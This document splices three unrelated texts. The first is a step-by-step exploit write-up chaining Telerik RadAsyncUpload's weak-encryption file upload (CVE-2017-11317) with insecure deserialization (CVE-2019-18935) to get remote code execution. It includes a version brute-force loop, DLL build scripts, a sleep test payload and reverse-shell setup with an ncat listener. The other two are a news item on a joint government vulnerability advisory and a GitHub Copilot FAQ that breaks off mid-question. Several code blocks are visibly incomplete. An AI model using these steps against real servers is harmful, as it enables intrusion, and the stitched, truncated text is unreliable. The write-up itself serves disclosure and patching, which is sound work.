RadAsyncUpload has previously been the subject of a number of vulnerabilities, including CVE-2014-2217, which is a path traversal vulnerability in the handler's file upload POST requests that results in unrestricted file upload. (Don't confuse it with CVE-2017-11317, which also yields unrestricted file upload, but through a different vector…more on that shortly.)

CVE-2014-2217 is outside of the scope of this post, but it's important that we mention it here, since Telerik responded to this issue by encrypting a particular portion of file upload requests to prevent attackers from tampering with sensitive settings. Specifically, Telerik encrypted the `rauPostData` POST parameter, which contains a serialized object that holds configuration details about how the file should be handled (e.g., the destination directory on the web server where the file should be uploaded). If attackers were able to break the encryption protecting the configuration object in `rauPostData`, they could:

* Modify the configuration to allow file uploading anywhere they like on the target web server. This issue (CVE-2017-11317) is a well-known vulnerability and has already been reported on.
* Modify the type of the object in `rauPostData`, allowing them to control the object's behavior while it's being deserialized. This issue (CVE-2019-18935) is the main subject of this post.

In summary, in order to exploit insecure deserialization (CVE-2019-18935) in this file handler, we must first break the encryption that the handler uses to protect file upload POST requests (CVE-2017-11317).

### CVE-2017-11317 - Unrestricted File Upload via Weak Encryption

Until R2 2017 SP1 (v2017.2.621), RadAsyncUpload's `AsyncUploadHandler` was configured with a hard-coded key that was used to encrypt form data in file upload requests. If this encryption key was not changed from its default value of `PrivateKeyForEncryptionOfRadAsyncUploadConfiguration`, an attacker could use that key to craft a file upload request to `/Telerik.Web.Ui.WebResource.axd?type=rau` with a custom encrypted `rauPostData` POST parameter. If an attacker specified an arbitrary value for the `TempTargetFolder` variable within the encrypted `rauPostData` POST parameter, it would effectively allow file uploads to any directory where the web server had write permissions. Please refer to [@straightblast's write-up](https://github.com/straightblast/UnRadAsyncUpload/wiki) for a detailed breakdown of `rauPostData`'s structure (and of this vulnerability in general), and Telerik's [security advisory](https://www.telerik.com/support/kb/aspnet-ajax/upload-%28async%29/details/unrestricted-file-upload) for how this vulnerability was remediated.

### CVE-2019-18935 - Remote Code Execution via Insecure Deserialization

Even though the unrestricted file upload vulnerability had been extensively discussed since its discovery in 2017, Markus Wulftange [took a closer look](https://codewhitesec.blogspot.com/2019/02/telerik-revisited.html) at the way RadAsyncUpload processed the `rauPostData` parameter in file upload requests in early 2019. He noted that `rauPostData` contains both the serialized configuration object **and** the object's type. `AsyncUploadHandler` uses the type specified within `rauPostData` to prepare .NET's [`JavaScriptSerializer.Deserialize()`](https://docs.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer.deserialize?view=netframework-4.8) method to properly deserialize the object.

During deserialization, `JavaScriptSerializer` calls setter methods for the specified object type. If this type is controlled by an attacker, this can lead to a dangerous scenario where the attacker may specify the type to be a [gadget](https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles). A gadget is a class within the executing scope of the application that, as a side effect of being instantiated and modified via setters or field assignment, has special properties that make it useful during deserialization. A remote code execution (RCE) gadget's properties allow it to perform operations that facilitate executing arbitrary code.

Rather than submitting the usual expected `Telerik.Web.UI.AsyncUploadConfiguration` type within `rauPostData`, an attacker can submit a file upload POST request specifying the type as an RCE gadget instead. After using the aforementioned unrestricted file upload vulnerability to upload a malicious mixed mode assembly DLL, an attacker may follow up with a second request to force `JavaScriptSerializer` to deserialize an object of type `<a href="https://docs.microsoft.com/en-us/dotnet/api/system.configuration.install.assemblyinstaller?view=netframework-4.8" target="_blank" rel="noreferrer noopener">System.Configuration.Install.AssemblyInstaller</a>`. When deserialized along with an attacker-supplied [path](https://docs.microsoft.com/en-us/dotnet/api/system.configuration.install.assemblyinstaller?view=netframework-4.8) property pointing to the uploaded DLL, this will cause the application to load the DLL into its current domain. As long as the mixed mode assembly DLL is of the same architecture as the loading process, its entry-point function [DDLMain()](https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain) will be called when the DLL is loaded. For more details, please refer to Implications of Loading .NET Assemblies and [Friday the 13th JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf).

### OK, What's a Mixed Mode Assembly?

According to MSDN, a [mixed mode assembly](https://docs.microsoft.com/en-us/cpp/dotnet/mixed-native-and-managed-assemblies?view=vs-2019) contains "both unmanaged machine instructions and [CIL] instructions." If you're unfamiliar with the .NET framework, then these terms may not mean anything to you. Let's break these down a bit, starting with a useful description from Wikipedia about how programs execute when developed in .NET:

Programs written for .NET Framework execute in a software environment (in contrast to a hardware environment) named the Common Language Runtime (CLR). The CLR is an application virtual machine that provides services such as security, memory management, and exception handling. As such, computer code written using .NET Framework is called "managed code."

So, "managed" code is written to run exclusively under the CLR, a layer that wraps native compiled code to prevent some common problems (e.g., buffer overflows) and abstract away some platform-specific implementation details to make code more portable. C# is often considered a managed language as it's typically compiled to CIL (Common Intermediate Language—a platform-independent language between source code and final native machine code) to be run under the CLR. CIL, in turn, is compiled into native code by a just-in-time compiler within the CLR. Conversely, code that does *not* target the CLR is known as "unmanaged" code (e.g., your average C program).

An [assembly](https://docs.microsoft.com/en-us/dotnet/standard/assembly/) is a package containing precompiled CIL code that can be executed in the CLR. It is the most fundamental unit of deployment for a .NET application, and can be implemented as an EXE or DLL file. An assembly also contains a manifest that details, among other things, metadata about the assembly's name and version. For further reading, check out this [article about injecting .NET assemblies](https://thewover.github.io/Introducing-Donut/) which provides a useful .NET primer, and a related article on [mixed assemblies](https://thewover.github.io/Mixed-Assemblies/).

## CVE-2019-18935 Exploit Details

Now with our background knowledge of the prerequisite unrestricted file upload vulnerability (CVE-2017-11317), the deserialization vulnerability itself, and mixed mode assemblies, we can now explore this exploit step by step.

### Identify Software Version

Before attempting to exploit Telerik UI for ASP.NET AJAX, confirm first that the file upload handler is registered:

```
curl -sk <HOST>/Telerik.Web.UI.WebResource.axd?type=rau
{ "message" : "RadAsyncUpload handler is registered successfully, however, it may not be accessed directly." }

```

Additionally, you’ll need to confirm that the web application is using a vulnerable version of this software. Conveniently, Telerik publishes a [release history](https://www.telerik.com/support/whats-new/aspnet-ajax/release-history) that details all major software versions since April 2007.

#### Without Authentication

If the application using RadAsyncUpload does not require authentication, then you can usually find the UI version buried somewhere in the HTML source of the application's home page. The location of the version string isn't consistent, though, so the best method of locating it is to use Burp to [search](https://portswigger.net/burp/documentation/desktop/functions/search) for the regular expression `20[0-9]{2}(\.[0-9]*)+` (and make sure you check the "Regex" box). You can also accomplish this with cURL:

```
curl -skL <HOST> | grep -oE '20[0-9]{2}(\.[0-9]*)+'
```

If that doesn't work, you can alternatively search for the string `<script src="/WebResource` to identify any JavaScript files that are included in the site's home page. Choose one of the static resources there and examine its `Last-Modified` date in the HTTP response header; that date should roughly match the release date of the software. For example, a JavaScript resource bundled with UI for ASP.NET AJAX Q1 2013 (v2013.1.220, released on February 20, 2013) will read `Last-Modified: Wed, 20 Feb 2013 00:00:00 GMT` in the HTTP response header for that file.

#### With Authentication

If the application **does** require authentication, then you may be able to determine the software version via brute force. Since uploading a file with RadAsyncUpload requires providing the correct version of Telerik UI, you can use Paul Taylor’s [RAU\_crypto](https://github.com/bao7uo/RAU_crypto) exploit to submit file upload requests with known-vulnerable versions until you find one that works:

```
echo 'test' > testfile.txt
for VERSION in 2007.1423 2007.1521 2007.1626 2007.2918 2007.21010 2007.21107 2007.31218 2007.31314 2007.31425 2008.1415 2008.1515 2008.1619 2008.2723 2008.2826 2008.21001 2008.31105 2008.31125 2008.31314 2009.1311 2009.1402 2009.1527 2009.2701 2009.2826 2009.31103 2009.31208 2009.31314 2010.1309 2010.1415 2010.1519 2010.2713 2010.2826 2010.2929 2010.31109 2010.31215 2010.31317 2011.1315 2011.1413 2011.1519 2011.2712 2011.2915 2011.31115 2011.3.1305 2012.1.215 2012.1.411 2012.2.607 2012.2.724 2012.2.912 2012.3.1016 2012.3.1205 2012.3.1308 2013.1.220 2013.1.403 2013.1.417 2013.2.611 2013.2.717 2013.3.1015 2013.3.1114 2013.3.1324 2014.1.225 2014.1.403 2014.2.618 2014.2.724 2014.3.1024 2015.1.204 2015.1.225 2015.2.604 2015.2.623 2015.2.729 2015.2.826 2015.3.930 2015.3.1111 2016.1.113 2016.1.225 2016.2.504 2016.2.607 2016.3.914 2016.3.1018 2016.3.1027 2017.1.118 2017.1.228 2017.2.503 2017.2.621 2017.2.711 2017.3.913; do
    echo -n "$VERSION: "
    python3 RAU_crypto.py -P 'C:\Windows\Temp' "$VERSION" testfile.txt <HOST>/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null | grep fileInfo || echo done

```

When the file upload succeeds, you'll see a JSON response containing some encrypted data about the uploaded file:

```
{"fileInfo":{"FileName":"<NAME>","ContentType":"text/html","ContentLength":<LENGTH>,"DateJson":"<DATE>","Index":0}, "metaData":"VGhpcyBpc24ndCByZWFsIGRhdGEsIGJ1dCB0aGUgQmFzZTY0LWVuY29kZWQgZGF0YSBsb29rcyBqdXN0IGxpa2UgdGhpcy4=" }
```

Now that you’ve verified that the handler is registered and the software is using a vulnerable version, you can proceed to exploit the vulnerability.

### Verify Deserialization Vulnerability with Sleep()

In preparing to fully compromise a remote host with a reverse shell, you can initially verify the deserialization vulnerability by uploading and loading a simple mixed mode assembly DLL that causes the web application to sleep for 10 seconds. A simple program, `sleep.c`, will do just that.

*Note that I use C, rather than C++, because I've encountered rare occasions where I was unable to execute compiled C++ code on a remote server. I suspect that this is because the target environment did not have the Microsoft Visual C++ Redistributable installed.*

[sleep.c](https://github.com/noperator/CVE-2019-18935/blob/master/sleep.c)

```
#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
<b>    if</b> (fdwReason == DLL_PROCESS_ATTACH)
<b>        Sleep</b>(10000);  // Time interval in milliseconds.
<b>    return</b> TRUE;
}

```

Create a bare C# class in `empty.cs` to constitute the managed portion of your mixed mode assembly:

```
<b>class</b> Empty {}

```

Then, in a Windows environment with Visual Studio installed, open a command prompt and run `build_dll.bat sleep.c`: [build\_dll.bat](https://github.com/noperator/CVE-2019-18935)

```
```vbscript
@echo off

set PROGRAM=%1
set BASENAME=%PROGRAM:~0,-2%

for /f "tokens=2-4 delims=/ " %%a in ("%DATE%") do (
    set YYYY=%%c
    set MM=%%a
    set DD=%%b
)
for /f "tokens=1-4 delims=/:." %%a in ("%TIME: =0%") do (
    set HH=%%a
    set MI=%%b
    set SS=%%c
    set FF=%%d
)
set DATETIME=%YYYY%%MM%%DD%%HH%%MI%%SS%%FF%

@echo on

for %%a in (x86 amd64) do (
    setlocal
    call "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvarsall.bat" %%a
    csc /target:module empty.cs
    cl /c %PROGRAM%
    link /DLL /LTCG /CLRIMAGETYPE:IJW /out:%BASENAME%_%DATETIME%_%%a.dll %BASENAME%.obj empty.netmodule
    del %BASENAME%.obj empty.netmodule
    endlocal
)
```

```

This batch script accomplishes the following:

* Sets environment variables to compile both 32- and 64-bit code
* Compiles the `empty.cs` C# program as a `.netmodule` file (without generating an assembly)
* Compiles the specified C program (`sleep.c`, in this case) as an `.obj` file (without linking)
* Links the compiled `.netmodule` and `.obj` files, which creates a mixed mode assembly DLL with a unique name

#### A Cautionary Note About Assembly Names

The assembly's name as specified in `link /out` is baked into the assembly's manifest, and will persist even if the file name changes on disk. It's crucial that the assembly is uniquely named at linking time since a .NET application will **only load an assembly once** with a given name. This means that an assembly "`sleep_123.dll`" may cause the application to sleep the first time that DLL is loaded through deserialization, but it certainly won't successfully load again; you'll need to rerun `build_dll.bat` to generate a new assembly for each exploit attempt on the same server.

Before uploading the DLL, it's important to understand what's going to happen on disk on the remote server. RadAsyncUpload will upload your file to a temporary directory whose location is under your control. If you happen to upload two files with the same name (we're talking about file names on disk, not assembly names in a manifest), RadAsyncUpload will *append* (not overwrite!) the new file to the old one. If the application attempts to load the resulting malformed DLL, it can cause the application to crash—so it's extremely important that you use a unique file name each time you upload a file to the target.

#### Exploit

The following exploit script leverages the core RadAsyncUpload encryption logic provided by Paul Taylor's `RAU_crypto.py` to craft an encrypted `rauPostData` POST parameter; this enables access to the vulnerable `AsyncUploadHandler` class through which we can upload files and deserialize arbitrary object types. This script also ensures that each uploaded file has a unique name on disk.

Without being able to remotely determine the architecture of the web server's underlying host, you may need to attempt to trigger this vulnerability with both the 32- and 64-bit DLL versions until you find one that works. Invoke the script as follows:

If the application pauses for approximately 10 seconds before responding, you've got a working deserialization exploit!

### Exploit with Reverse Shell

Now that we've verified that we can exploit this vulnerable version of Telerik UI for ASP.NET AJAX, we can instead exploit it with a DLL that spawns a reverse shell to connect back to a server that we control. We use `rev_shell.c` below, a program that launches a reverse shell as a thread when the DLL is loaded; the threaded nature of this program prevents the shell process from blocking the web application's user interface while running: [rev\_shell.c](https://github.com/noperator/CVE-2019-18935)

```

Modify `rev_shell.c` with the hostname and port of the C2 server where you'll be listening for a callback:

```
sed -i .bu 's/<HOST>/<HOST>/; s/<PORT>/<PORT>/' rev_shell.c

```

Using the same method of compiling and linking described above, generate your mixed mode assembly DLL:

```
build_dll.bat rev_shell.c

```

Open a Netcat listener to catch the callback:

```
sudo ncat -lvp <PORT>

```

## How to Patch

The [Telerik security advisory](https://www.telerik.com/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization) tells you what you need to know, but we’ll repeat the most important parts here:

* Upgrade Telerik for ASP.NET AJAX to [R3 2019 SP1](https://www.telerik.com/support/whats-new/aspnet-ajax/release-history/ui-for-asp-net-ajax-r3-2019-sp1-%28version-2019-3-1023%29) (v2019.3.1023) or later.
* Read Telerik's [RadAsyncUpload security guide](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security) in its entirety, and configure the control according to the [recommended security settings](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security#recommended-settings).

## Conclusion

This write-up has demonstrated how an attacker can chain exploits for unrestricted file upload (CVE-2017-11317) and insecure deserialization (CVE-2019-18935) vulnerabilities to execute arbitrary code on a remote machine.

In recent years, insecure deserialization has emerged as an effective attack vector for executing arbitrary code in object-oriented programming frameworks. As we continue to identify and understand this class of vulnerabilities, it’s important that vendors and users employ timely communication to combat the risk posed by vulnerable software. Now that Telerik has released a patch and security advisory for this vulnerability, affected users should do their part by updating and securely configuring their applications.

![FBI reveals top targeted vulnerabilities of the last two years](https://www.bleepstatic.com/content/hl-images/2021/05/06/Globe-network-map.jpg)

A joint security advisory issued today by several cybersecurity agencies from the US, the UK, and Australia reveals the top 30 most targeted security vulnerabilities of the last two years.

CISA, the Australian Cyber Security Centre (ACSC), the United Kingdom's National Cyber Security Centre (NCSC), and the Federal Bureau of Investigation (FBI) also shared mitigation to help private and public sector organizations counter these vulnerabilities

"Collaboration is a crucial part of CISA’s work and today we partnered with ACSC, NCSC and FBI to highlight cyber vulnerabilities that public and private organization should prioritize for patching to minimize risk of being exploited by malicious actors," said Eric Goldstein, CISA Executive Assistant Director for Cybersecurity.

## Attacks focused remote work, VPN, cloud technologies

Based on data collected by the US Government, most of the top targeted bugs last year were disclosed since the start of 2020, with this trend stemming from the recent move to remote work since the beginning of the pandemic.

"The rapid shift and increased use of remote work options, such as virtual private networks (VPNs) and cloud-based environments, likely placed additional burden on cyber defenders struggling to maintain and keep pace with routine software patching," CISA [explains](https://us-cert.cisa.gov/ncas/alerts/aa21-209a).

With threat actors taking advantage of the move to remote working, four of the most routinely targeted vulnerabilities during 2020 impact work-from-home (WFH), VPNs, or cloud-based technologies, as revealed in the table below.

"In 2021, malicious cyber actors continued to target vulnerabilities in perimeter-type devices. Among those highly exploited in 2021 are vulnerabilities in Microsoft, Pulse, Accellion, VMware, and Fortinet," CISA added.

As further shown in the advisory, attackers keep exploiting publicly known (often old) security bugs affecting a broad set of targets from various industry sectors.

| **Vendor** | **CVE** | **Type** |
| --- | --- | --- |
| Citrix | CVE-2019-19781 | arbitrary code execution |
| Pulse | CVE 2019-11510 | arbitrary file reading |
| Fortinet | CVE 2018-13379 | path traversal |
| F5- Big IP | CVE 2020-5902 | remote code execution (RCE) |
| MobileIron | CVE 2020-15505 | RCE |
| Microsoft | CVE-2017-11882 | RCE |
| Atlassian | CVE-2019-11580 | RCE |
| Drupal | CVE-2018-7600 | RCE |
| Telerik | CVE 2019-18935 | RCE |
| Microsoft | CVE-2019-0604 | RCE |
| Microsoft | CVE-2020-0787 | elevation of privilege |
| Netlogon | CVE-2020-1472 | elevation of privilege |

## Organizations urged to patch their systems

CISA, ACSC, the NCSC, and the FBI advise public and private orgs worldwide to patch and update their systems as soon as possible to decrease their attack surface

"Entities worldwide can mitigate the vulnerabilities listed in this report by applying the available patches to their systems and implementing a centralized patch management system," the joint advisory added.

Those who cannot immediately patch or don't plan to patch soon should check for signs of compromise and immediately initiate incident response and recovery plans.

The complete list of Common Vulnerabilities and Exposures (CVEs) routinely exploited in attacks during the last two years is available in the [joint advisory](https://us-cert.cisa.gov/ncas/alerts/aa21-209a) published earlier today.

The four agencies have also released indicators of compromise, recommended mitigations, detection methods, and links to patches for each of the vulnerabilities listed in the advisory.

"The advisory published today puts the power in every organisation’s hands to fix the most common vulnerabilities, such as unpatched VPN gateway devices," [added Paul Chichester, NCSC's Director for Operations](https://www.ncsc.gov.uk/news/global-cyber-vulnerabilities-advice).

"Working with our international partners, we will continue to raise awareness of the threats posed by those that seek to cause harm."

Last week, MITRE also shared this year's [top 25 list of most common and dangerous weaknesses](https://www.bleepingcomputer.com/news/security/mitre-updates-list-of-top-25-most-dangerous-software-bugs/) plaguing software throughout the previous two years.

One year ago, CISA and the FBI had also published [a list of the top 10 most exploited security vulnerabilities between 2016 and 2019](https://www.bleepingcomputer.com/news/security/us-govt-shares-list-of-most-exploited-vulnerabilities-since-2016/).

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### What if I do not want Copilot?

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

Access to Copilot Business and Enterprise is managed by your GitHub Administrator. They can control access to preview features, models, and set Copilot policies for your organization. Additionally, you can use your network firewall to explicitly allow access to Copilot Business and/or block access to Copilot Pro or Free. For more details, refer to the [documentation](https://docs.github.com/en/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization).

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

